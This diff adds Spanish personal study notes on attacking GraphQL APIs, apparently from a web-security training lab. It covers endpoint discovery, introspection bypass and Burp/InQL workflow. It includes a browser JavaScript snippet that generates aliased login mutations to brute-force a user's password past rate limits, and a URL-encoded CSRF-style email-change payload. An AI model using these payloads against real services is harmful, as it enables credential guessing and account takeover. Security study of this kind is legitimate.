@@ -1,0 +1,49 @@
+/graphql
+/api
+/api/graphql
+/graphql/api
+/graphql/graphql
+.../v1
+
+Si la introspección no se ejecuta debemos eliminar , onOperation, onFragment y onField,
+ o escapamos caracteres ,el developer ha excluido `__schema`
+
+
+Con extensión INQl copiamos URL y escaneamos
+Mientras mandamos introspección con botón derecho
+Vemos campos sospechosos y si falta algo tratamndo de ocultarlo
+pestaña extensión InQL y pegamos lo que hay en queries, cambiando variables
+Obtenemos passswd
+
+Exactamente lo mismo atrás, buscando un campo password
+
+Mandamos a intruder / , y le decimos que no decodee los caracteres para que descubra
+si los decodea solo significa que debemos mandar los POST encodeado en URL
+/api?query=query{__schema
+{queryType{name}}} HTTP/2 --> encodearlo todo y mandar con salto de línea 
+Mandar query intorspeccion en pestaña Graphql CON SALTO DE LÍNEA
+Mandar al sitemap el response
+Vemos en sitemap algunas consultas
+Las mando al repeater y veo que puedo funciones hay y qué id poner
+Visualizar las querys --> https://nathanrandal.com/graphql-visualizer/
+
+Si ponemos la contraseña mal nos bloquea por IP y nos da psitas de cuándo la passwd es sucess
+realizar introspección con btn derecho --> Graphql --< introspection
+mandar response a sitemap --> mutacion al response
+Dejar así el Graphql
+mutation login {
+    PEGAR AQUÍ  LO QUE SALGA DEL SIGUIENTE SCRIPT
+}
+Poner lo siguiente en una consola de browser o pedírselo a chatgpt para hacer fuerza bruta, viendo la estructuroa del response del mutation y modificar script en consecuenia
+copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
+bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
+        token
+        success
+    }
+`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
+
+Mandamos introspección el change-email, 
+cambio content-type: application/x-www-form-urlencoded
+Cambiamos  a HTML y Encodeamos a URL se puede hacer facil con visual studio quitandio comillas y añadiendo &-->
+{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"aef@asef.com"}}}
+ query=%0Amutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0AchangeEmail%28input%3A+%24input%29+%7B%0Aemail%0A7D%0A7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
